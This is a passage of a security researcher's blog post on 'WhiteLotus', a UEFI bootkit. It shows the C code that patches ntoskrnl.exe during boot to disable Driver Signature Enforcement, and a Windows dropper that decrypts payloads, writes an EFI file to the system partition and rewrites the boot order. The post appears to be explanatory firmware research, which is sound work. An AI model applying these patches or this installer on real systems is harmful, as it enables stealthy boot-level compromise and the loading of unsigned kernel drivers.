+<h3 id="touching-ntoskrnlexe-before-it-wakes-up"><strong>Touching ntoskrnl.exe Before It Wakes Up</strong></h3>
+<p>The kernel patching logic lives in <code>PatchKernel.c</code>. The main function is <code>PatchNtoskrnl()</code>, and the important work happens in <code>DisableDSE()</code>.</p>
+<p>The target here is Driver Signature Enforcement. Normally, Windows does not allow arbitrary unsigned kernel-mode drivers to load. That enforcement involves Code Integrity paths, including CI-related initialization and image validation behavior. I wanted to keep this patch small and understandable, because giant magical byte patches are terrible for learning. If I cannot explain why a byte is changed, then I probably should not change it.</p>
+<p>WhiteLotus first finds the import address for <code>CI.dll!CiInitialize</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CONST EFI_STATUS IatStatus <span style="color:#f92672">=</span> <span style="color:#a6e22e">FindIATAddressForImport</span>(
+</span></span><span style="display:flex;"><span>    ImageBase,
+</span></span><span style="display:flex;"><span>    NtHeaders,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;CI.dll&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;CiInitialize&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>CiInitialize
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Then it scans the <code>PAGE</code> section of <code>ntoskrnl.exe</code>. The goal is to locate the nearby code path in <code>SepInitializeCodeIntegrity</code>.</p>
+<p>The project tracks recent <code>ecx</code> writes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((PageStart[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x33</span> <span style="color:#f92672">&amp;&amp;</span> PageStart[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xC9</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (PageStart[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x31</span> <span style="color:#f92672">&amp;&amp;</span> PageStart[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xC9</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (PageStart[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xB1</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (PageStart[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x89</span> <span style="color:#f92672">&amp;&amp;</span> (PageStart[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF8</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xC8</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>    (PageStart[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8B</span> <span style="color:#f92672">&amp;&amp;</span> (PageStart[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF8</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xC8</span>))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    LastMovEcx <span style="color:#f92672">=</span> PageStart <span style="color:#f92672">+</span> i;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Then it searches for a RIP-relative call pattern that references the <code>CiInitialize</code> IAT address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (PageStart[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xFF</span> <span style="color:#f92672">&amp;&amp;</span> PageStart[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x15</span>) {
+</span></span><span style="display:flex;"><span>    CONST UINT8<span style="color:#f92672">*</span> Rip <span style="color:#f92672">=</span> PageStart <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>    INT32 Disp <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(INT32<span style="color:#f92672">*</span>)(PageStart <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>    CONST UINT8<span style="color:#f92672">*</span> TargetAddr <span style="color:#f92672">=</span> Rip <span style="color:#f92672">+</span> Disp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (TargetAddr <span style="color:#f92672">==</span> (CONST UINT8<span style="color:#f92672">*</span>)CiInitialize) {
+</span></span><span style="display:flex;"><span>        SepInitializeMovEcxAddress <span style="color:#f92672">=</span> LastMovEcx;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The patch itself is small:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>UINT8 XorEcxPatch[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0xC9</span> };
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyWpMem</span>((VOID<span style="color:#f92672">*</span>)SepInitializeMovEcxAddress, XorEcxPatch, <span style="color:#66d9ef">sizeof</span>(XorEcxPatch));
+</span></span></code></pre></div><p><code>33 C9</code> is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
+</span></span></code></pre></div><p>The second patch searches for:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xC0000428</span>
+</span></span></code></pre></div><p>This value is a failure status used around image validation. WhiteLotus replaces the immediate with zero:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>UINT32 Zero <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyWpMem</span>((VOID<span style="color:#f92672">*</span>)(SeValidateImageDataMovEaxAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>), <span style="color:#f92672">&amp;</span>Zero, <span style="color:#66d9ef">sizeof</span>(Zero));
+</span></span></code></pre></div><p>So the high-level idea is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>SepInitializeCodeIntegrity
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | force CI initialization path into disabled-looking state
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>SeValidateImageData
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | replace signature failure status with success
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>unsigned kernel image loading becomes possible
+</span></span></code></pre></div><p>The patches are small, but the timing makes them powerful. They are applied after the kernel image is loaded and before the kernel begins its normal life. That timing is basically the whole trick.</p>
+<h3 id="the-windows-side-loader"><strong>The Windows-Side Loader</strong></h3>
+<p>The DXE side is the main research component, but WhiteLotus also contains a Windows-side deployment path under <code>WhiteLotusEXE</code>.</p>
+<p>There are two subprojects:</p>
+<ul>
+<li><strong>Dropper</strong>: decrypts embedded payloads, writes <code>loadefi.exe</code> into <code>%LOCALAPPDATA%</code>, and launches an auxiliary payload.</li>
+<li><strong>LoadEfi</strong>: locates the EFI System Partition, writes the EFI payload, and creates a boot entry.</li>
+</ul>
+<p>The loader begins by enabling <code>SeSystemEnvironmentPrivilege</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnablePrivilege</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;SeSystemEnvironmentPrivilege&#34;</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[!] Failed to enable SeSystemEnvironmentPrivilege.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This privilege is needed because Windows does not allow normal processes to freely edit firmware environment variables. If a program is going to read or write <code>BootOrder</code>, <code>BootNext</code>, or <code>Boot000X</code>, it needs to cross that boundary first.</p>
+<p>Then it checks Secure Boot:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>DWORD Ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFirmwareEnvironmentVariableExW</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;SecureBoot&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;{8be4df61-93ca-11d2-aa0d-00e098032b8c}&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>Value,
+</span></span><span style="display:flex;"><span>    Size,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>Attrs
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>This is expected. If Secure Boot is enabled, unsigned or untrusted EFI components should not be allowed to execute in the normal path. WhiteLotus is clearly designed for a Secure Boot disabled research environment.</p>
+<p>The next problem is simple but annoying: where is the EFI System Partition? I could mount a drive letter manually and call it a day, but that would be a lazy assumption. <code>LoadEfi</code> searches volumes, maps each volume to its disk extent, reads GPT layout information, and checks for the ESP partition type GUID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (Pi<span style="color:#f92672">-&gt;</span>PartitionStyle <span style="color:#f92672">==</span> PARTITION_STYLE_GPT <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">GuidEqual</span>(<span style="color:#f92672">&amp;</span>Pi<span style="color:#f92672">-&gt;</span>Gpt.PartitionType, <span style="color:#f92672">&amp;</span>EspPartitionTypeGuid) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>    Pi<span style="color:#f92672">-&gt;</span>StartingOffset.QuadPart <span style="color:#f92672">==</span> Offset.QuadPart)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is better than assuming <code>S:\</code> or some other drive letter. The ESP often has no normal drive letter at all. So the code asks Windows about volumes and disk layout, then finds the actual firmware partition.</p>
+<p>After that, the encrypted EFI payload is decrypted with RC4 and written to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>\EFI\CUSTOM\loader.efi
+</span></span></code></pre></div><p>The file writing path uses <code>FILE_FLAG_WRITE_THROUGH</code> and also calls <code>FlushFileBuffers()</code>. This is not glamorous, but it is the kind of boring detail that matters in boot work. If the file is not really flushed to disk, the next boot may not see what you think you wrote.</p>
+<p>After the EFI file is in place, the loader builds a new UEFI load option and writes it as <code>Boot0009</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL Ok <span style="color:#f92672">=</span> <span style="color:#a6e22e">SetFirmwareEnvironmentVariableExW</span>(
+</span></span><span style="display:flex;"><span>    TARGET_BOOT_VAR,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;{8be4df61-93ca-11d2-aa0d-00e098032b8c}&#34;</span>,
+</span></span><span style="display:flex;"><span>    LoadOpt,
+</span></span><span style="display:flex;"><span>    LoadOptSize,
+</span></span><span style="display:flex;"><span>    TARGET_ATTRIBUTES
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Then it sets <code>BootNext</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>WORD BootNext <span style="color:#f92672">=</span> (WORD)TARGET_BOOT_INDEX;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetFirmwareEnvironmentVariableExW</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;BootNext&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;{8be4df61-93ca-11d2-aa0d-00e098032b8c}&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>BootNext,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(WORD),
+</span></span><span style="display:flex;"><span>    TARGET_ATTRIBUTES
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>And finally it prepends the new entry to <code>BootOrder</code>.</p>
+<p>The chain is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Windows process
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | enable SeSystemEnvironmentPrivilege
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>find ESP
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | write \EFI\CUSTOM\loader.efi
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>create Boot0009
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | set BootNext / BootOrder
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>next reboot executes WhiteLotusDXE
+</span></span></code></pre></div><p>This is where the project becomes a full boot-chain experiment rather than just a DXE driver sitting in a folder. I wanted the reboot itself to carry execution into the DXE payload, because that is closer to the real boot-chain problem than manually launching random EFI files from a shell.</p>
+<h3 id="conclusion"><strong>Conclusion</strong></h3>
+<p>WhiteLotus is a nice example of why firmware research feels different from normal userland or kernel work. The interesting part is not only the final DSE patch. The interesting part is the route: entering through DXE, watching <code>LoadImage()</code>, recognizing <code>bootmgfw.efi</code>, catching <code>winload.efi</code>, walking the loader block, and finally touching <code>ntoskrnl.exe</code> before it starts breathing :&gt;</p>
+
+                </div>
+                <div class="single-shell__back">
+                    <h4><a href="/">Back to Home</a></h4>
+                </div>
+                <button class="single-shell__scroll-top" type="button" aria-label="Scroll to top" data-ui="scroll-top">
+                    <span aria-hidden="true">^</span>
+                </button>
+            </div>
+            
+            <aside class="single-shell__aside">
+                
+                <section class="single-shell__author single-shell__author--desktop">
+                    <div class="single-shell__author-static" aria-hidden="true"></div>
+                    <div class="single-shell__author-heading">About Author</div>
+                    <div class="single-shell__author-card">
+                        <a class="single-shell__author-photo-link" href="https://github.com/0xbekoo">
+                        <div class="single-shell__author-photo-shell">
+                            <img class="single-shell__author-photo" src="https://github.com/0xbekoo.png" alt="0xbekoo">
+                        </div>
+                        </a>
+                        <div class="single-shell__author-body">
+                            <a class="single-shell__author-name-link" href="https://github.com/0xbekoo">
+                            <span class="single-shell__author-name" data-text="0xbekoo">0xbekoo</span>
+                            </a>
+                            <p class="single-shell__author-title">Low-Level Security Researcher</p>
+                        </div>
+                    </div>
+                </section>
+                
+                
+                <section class="single-shell__toc single-shell__toc--desktop">
+                    <div class="single-shell__toc-heading">
+                        <span class="single-shell__toc-label">Contents</span>
+                    </div>
+                    <div class="single-shell__toc-body">
+                        <nav id="TableOfContents-desktop">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#introduction"><strong>Introduction</strong></a></li>
+        <li><a href="#walking-into-the-boot-chain"><strong>Walking Into the Boot Chain</strong></a></li>
+        <li><a href="#the-first-hook"><strong>The First Hook</strong></a></li>
+        <li><a href="#inside-winloadefi"><strong>Inside winload.efi</strong></a></li>
+        <li><a href="#touching-ntoskrnlexe-before-it-wakes-up"><strong>Touching ntoskrnl.exe Before It Wakes Up</strong></a></li>
+        <li><a href="#the-windows-side-loader"><strong>The Windows-Side Loader</strong></a></li>
+        <li><a href="#conclusion"><strong>Conclusion</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                </section>
+                
+            </aside>
+            
+        </div>
+    </div>
+</article>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    0xbekoo
+
+<span id="thisyear">2026</span>
+
+    | 0xbekoo.github.io
+
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://x.com/0xbekooo">Twitter</a> 
+        
+        <a href="https://github.com/0xbekoo">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/blog-callouts.css"><link rel="stylesheet" href="/css/mobile-reading.css"><link rel="stylesheet" href="/css/duat-gate.css"><link rel="stylesheet" href="/css/home-glitch.css"><link rel="stylesheet" href="/css/duat-boot.css"><link rel="stylesheet" href="/css/page-slide.css">
+<script src="/js/jquery.js"></script>
+
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: false , 
+        speedFactor: 1.5 ,
+        duatBootImage: "/images/blog-images/hour.jpg"
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script>
+<script src="/js/duat-boot.js"></script>
+<script src="/js/mobile-image-lightbox.js"></script>
+<script src="/js/page-slide.js"></script>
+</html>
